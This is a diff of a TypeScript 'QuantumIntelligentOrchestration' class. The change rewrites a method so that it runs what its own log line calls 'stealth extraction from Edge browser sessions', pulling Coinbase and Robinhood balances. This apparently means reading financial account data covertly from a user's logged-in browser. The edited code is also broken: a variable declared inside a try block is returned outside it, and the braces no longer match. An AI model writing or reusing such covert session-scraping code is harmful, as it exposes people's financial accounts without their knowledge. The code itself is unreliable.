@@ -201,27 +201,30 @@ export class QuantumIntelligentOrchestration {
     const strategy = this.strategies.get('real_balance_extraction');
     if (!strategy) return;
 
-    console.log('💰 Orchestrating real balance extraction...');
+    console.log('🔍 NEXUS: Orchestrating stealth extraction from Edge browser sessions...');
 
-    // Activate quantum bypass for all requests
-    await quantumBypass.activateQuantumMode();
+    try {
+      // Direct browser session extraction
+      const extractionPromises = [
+        this.extractCoinbaseBalance(),
+        this.extractRobinhoodBalance(),
+        this.validateBalanceData()
+      ];
 
-    // Coordinate multiple extraction attempts
-    const extractionPromises = [
-      this.extractCoinbaseBalance(),
-      this.extractRobinhoodBalance(),
-      this.validateBalanceData()
-    ];
+      const results = await Promise.allSettled(extractionPromises);
+      
+      // Process and validate results
+      const validResults = results
+        .filter(result => result.status === 'fulfilled')
+        .map(result => (result as PromiseFulfilledResult<any>).value);
 
-    const results = await Promise.allSettled(extractionPromises);
-    
-    // Process and validate results
-    const validResults = results
-      .filter(result => result.status === 'fulfilled')
-      .map(result => (result as PromiseFulfilledResult<any>).value);
+      if (validResults.length > 0) {
+        console.log('✅ Real balance extraction successful via orchestration');
+      }
 
-    if (validResults.length > 0) {
-      console.log('✅ Real balance extraction successful via orchestration');
+    } catch (error) {
+      console.error('Orchestration error:', error);
+    }
       return validResults[0];
     }
   }
